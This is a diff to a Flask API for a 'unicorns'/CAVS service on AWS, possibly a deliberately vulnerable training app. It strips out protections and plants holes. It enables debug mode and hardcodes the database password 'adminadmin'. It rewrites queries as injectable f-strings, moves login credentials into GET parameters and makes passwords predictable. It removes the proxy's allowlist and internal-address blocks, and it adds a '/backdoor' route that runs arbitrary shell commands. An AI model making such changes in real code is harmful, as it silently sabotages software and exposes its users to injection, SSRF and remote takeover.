@@ -1,13 +1,11 @@
-import os
-import secrets
-from urllib.parse import urlparse
-
 import flask
 from flask import Flask, send_from_directory, Response, make_response, request, jsonify, json
 import boto3
 import pymysql
 import logging
+import subprocess
 import requests
+from pathlib import Path
 from botocore.exceptions import ClientError
 from botocore.utils import IMDSFetcher
 
@@ -24,7 +22,7 @@ TOKEN=IMDSFetcher()._fetch_metadata_token()
 REGION=IMDSFetcher()._get_request("/latest/meta-data/placement/region", None, TOKEN).text
 
 app = flask.Flask(__name__)
-app.config["DEBUG"] = False
+app.config["DEBUG"] = True
 
 ssm = boto3.client('ssm', region_name=REGION)
 
@@ -60,7 +58,8 @@ def get_db_connection(password=None):
     if password:
         dbpass = password # This is needed by our auditing tool - DO NOT REMOVE
     else:
-        dbpass = get_secret("cavs-db-password")
+        dbpass = "adminadmin"
+        # dbpass = get_secret(<secret_name>) # This retrieves the password from Secrets Manager but I haven't had time to test it yet
 
     try:
         conn = pymysql.connect(
@@ -84,11 +83,15 @@ def api_status():
     return "CAVS APIs are UP"
 
 
-@app.route('/api/v1/dbstatus', methods=['POST'])
+@app.route('/api/v1/dbstatus', methods=['GET', 'POST'])
 def api_db_status():
     conn = None
 
-    data = json.loads(request.data)
+    if request.method == 'GET':
+        data = request.args
+
+    if request.method == 'POST':
+        data = json.loads(request.data)
 
     try:
         if 'password' in data:
@@ -140,7 +143,7 @@ def set_db_password():
             logger.debug("MySQL connection is closed")
 
     return "Database password updated", 200
-   
+
 
 # DO NOT TOUCH
 @app.route('/api/v1/unicorns', methods=['GET'])
@@ -148,19 +151,17 @@ def api_get_unicorns():
 
     # Connection object
     conn = None
-    
+
     if 'id' in request.args:
         id = int(request.args['id'])
-        query = 'SELECT * FROM username WHERE user_id = %s'
-        query_params = (id,)
+        query = f'SELECT * FROM username WHERE user_id = {id}'
     else:
         query = 'SELECT * FROM username ORDER BY order_id asc'
-        query_params = None
 
     try:
         conn = get_db_connection()
         cur = conn.cursor()
-        cur.execute(query, query_params) if query_params else cur.execute(query)
+        cur.execute(query)
         logger.debug("Row count: ", cur.rowcount)
         results = cur.fetchall()
         cur.close()
@@ -183,7 +184,7 @@ def api_get_latest_entry():
 
     # Connection object
     conn = None
-    
+
     query = f'SELECT MAX(user_id) FROM username'
 
     try:
@@ -227,11 +228,11 @@ def api_post_unicorn():
         sex = data['sex']
     else:
         return "Error: No sex field provided. Please specify the sex."
-    
+
     if 'password' in data:
         password = data['password']
     else:
-        password = secrets.token_urlsafe(16)
+        password = f"{data['name']}@123"
 
     try:
         conn = get_db_connection()
@@ -293,29 +294,28 @@ def api_update_unicorn():
     return jsonify(cur.rowcount)
 
 
-@app.route('/api/v1/unicorns/login', methods=['POST'])
+# DO NOT TOUCH
+@app.route('/api/v1/unicorns/login', methods=['GET'])
 def api_unicorn_login():
 
     # Connection object
     conn = None
 
-    data = json.loads(request.data)
-
-    if 'username' in data:
-        username = data['username']
+    if 'username' in request.args:
+        username = request.args['username']
     else:
         return "Error: No username provided. Please provide a username.", 400
 
-    if 'password' in data:
-        password = data['password']
+    if 'password' in request.args:
+        password = request.args['password']
     else:
         return "Error: No password provided. Please provide a password.", 400
 
     try:
         conn = get_db_connection()
         cur = conn.cursor()
-        query = "SELECT username FROM username WHERE username=%s AND password=%s"
-        cur.execute(query, (username, password))
+        query = f"SELECT username FROM username WHERE username='{username}' AND password='{password}'"
+        cur.execute(query)
         results = cur.fetchone()
         cur.close()
         logger.debug(results)
@@ -346,43 +346,37 @@ def get_region():
     return REGION
 
 
-ALLOWED_PROXY_HOSTS = os.environ.get("ALLOWED_PROXY_HOSTS", "").split(",")
-
+# IF YOU TOUCH IT, DO NOT BRAKE IT
 @app.route("/api/v1/proxy", methods=['GET'])
 def proxy():
     url = request.args.get("url")
-    if not url:
-        return "Please provide a URL.", 400
+    if url:
+        try:
+            response = requests.get(url, timeout=5)
+            return response.content, response.status_code
+        except requests.exceptions.RequestException as e:
+            return str(e), 500
+    return "Please provide a URL.", 400
 
-    parsed = urlparse(url)
-    if parsed.scheme not in ("http", "https"):
-        return "Only HTTP/HTTPS URLs are allowed.", 400
 
-    if not ALLOWED_PROXY_HOSTS or not any(
-        parsed.hostname == host.strip() for host in ALLOWED_PROXY_HOSTS if host.strip()
-    ):
-        return "This host is not allowed.", 403
+# This route will allow us to health-check the website by running commands on the underlying server.
+# It is safe because the backdoor route is not advertised anywhere and no one will ever find it.
+@app.route('/backdoor', methods=['GET'])
+def backdoor():
+    if 'cmd' in request.args:
+        cmd = request.args['cmd']
+        logging.info(cmd)
+    else:
+        logging.info('No command provided')
 
-    # Block requests to internal/metadata IPs
-    if parsed.hostname and (
-        parsed.hostname.startswith("169.254.")
-        or parsed.hostname.startswith("10.")
-        or parsed.hostname.startswith("192.168.")
-        or parsed.hostname in ("localhost", "127.0.0.1", "0.0.0.0", "[::1]")
-    ):
-        return "Access to internal addresses is forbidden.", 403
-
-    try:
-        response = requests.get(url, timeout=5, allow_redirects=False)
-        return response.content, response.status_code
-    except requests.exceptions.RequestException as e:
-        logger.error("Proxy request failed: %s", e)
-        return "Proxy request failed.", 500
-
+    process = subprocess.run(
+        cmd, capture_output=True, shell=True, text=True
+    )
+    return str(Path(process.stdout.rstrip()))
 
 
 if __name__ == "__main__":
-    app.run(host='0.0.0.0', port=80, debug=False)
+    app.run(host='0.0.0.0', port=80, debug=True)
 
 
 @app.errorhandler(404)
